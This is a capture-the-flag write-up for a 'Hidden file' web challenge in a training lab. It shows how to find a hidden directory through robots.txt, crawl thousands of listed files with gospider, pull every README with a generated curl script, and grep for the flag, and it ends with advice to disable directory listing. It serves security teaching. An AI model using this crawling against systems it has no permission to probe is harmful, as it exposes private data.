# Breach: Hidden file


<br>

### >> [Flag file](../flag) <<

<br>


## Explanation:


#### Step 1:

- Go to the `robots.txt` file and check for any hidden directories.

> You will find a page named `/.hidden`.


#### Step 2:

- Access the `/.hidden` page.

> It's a file explorer page.


#### Step 3:

There is a looooooot of directories and files you can explore (aboute 18 000 files and more directories).<br>
Let's use a crawler to find every interesting files.

- Install `gospider` if you haven't already.

- Use `gospider` to crawl the page and find every `README` file.
  - The `-d 0` flag is used to specify the depth of the search. (0 means no depth limit)
  - The `-o results` flag is used to specify the output directory.
  - During the project, I hosted darkly on `19192.168.192.18:4243` but you should replace it with your IP address and port number.
```bash
gospider -s 'http://192.168.192.18:4243/.hidden/' -d 0 -o results
```

> Now, every pages and files found by `gospider` is saved in the `results` directory,<br>
>   here, under the name `192_168_192_18` :
> ```
> ...
> [url] - [code-200] - http://192.168.192.18:4243/.hidden/qcwtnvtdfslnkvqvzhjsmsghfw/lacqgphmpkmzjmaojyqnasjyvj/pupwvwozdhgnvmzdktffjxfiqc/README
> [url] - [code-200] - http://192.168.192.18:4243/.hidden/ldtafmsxvvydthtgflzhadiozs/xpvwxitxurnldvlkeyedmlsson/hrgjwugrgpxlrwntddjeoizipk/README
> [url] - [code-200] - http://192.168.192.18:4243/.hidden/xuwrcwjjrmndczfcrmwmhvkjnh/fnkbjkxzduuctvrzpvpdsllkwm/yivtvgtfhotbwchtwottzwghaa/
> ...
> ```


#### Step 4:

- Filter the results, keeping only the links to the README files.
```bash
cat results/192_168_192_18 | grep code-200 | sed -e 's/\\[.*\\] - //g' | grep -E '\.hidden/.*/README' > results/readmes
```

> Now, every link to a README file is saved in the `results/readmes` file :
> ```
> ...
> http://192.168.192.18:4243/.hidden/qcwtnvtdfslnkvqvzhjsmsghfw/lacqgphmpkmzjmaojyqnasjyvj/pupwvwozdhgnvmzdktffjxfiqc/README
> http://192.168.192.18:4243/.hidden/ldtafmsxvvydthtgflzhadiozs/xpvwxitxurnldvlkeyedmlsson/hrgjwugrgpxlrwntddjeoizipk/README
> ...
> ```


#### Step 5:

- Create a script to get the content of every README file.
```bash
echo '#!/bin/bash\necho > contents' > results/get_contents.sh
cat results/readmes | sed -e 's/^\(.*\)$/curl \"\1\" >> results\/contents/g' >> results/get_contents.sh
```

> The script `results/get_contents.sh` is created :
> ```bash
> #!/bin/bash
> echo > contents
> # ...
> curl "http://192.168.192.18:4243/.hidden/qcwtnvtdfslnkvqvzhjsmsghfw/lacqgphmpkmzjmaojyqnasjyvj/pupwvwozdhgnvmzdktffjxfiqc/README" >> results/contents
> curl "http://192.168.192.18:4243/.hidden/ldtafmsxvvydthtgflzhadiozs/xpvwxitxurnldvlkeyedmlsson/hrgjwugrgpxlrwntddjeoizipk/README" >> results/contents
> # ...
> ```


#### Step 6:

- Execute the script to get the content of every README file.
```bash
bash results/get_contents.sh
```

> The content of every README file is saved in the `results/contents` file :
> ```
> ...
> Demande à ton voisin de gauche  
> Demande à ton voisin du dessus  
> Non ce n'est toujours pas bon ...
> Demande à ton voisin du dessous 
> Toujours pas tu vas craquer non ?
> ...
> ```


#### Step 7:

- Look for the flag in the content of the README files.
```bash
cat results/contents | grep flag
```


<br>


## How to fix it:

> The goal of this flag is to teach us web-crawling :<br>
> making thousands of files is absolutely not a secure way to hide something.<br>
> So just restrict access to the sensitive content and that's it, you're done.

- Do not allow file and directory listing on your server.<br>
  This could never be a good idea.<br>
  Or at least restrict the listing pages to certain users, not every random guy.


---

[[Back to main page](/#darkly)]
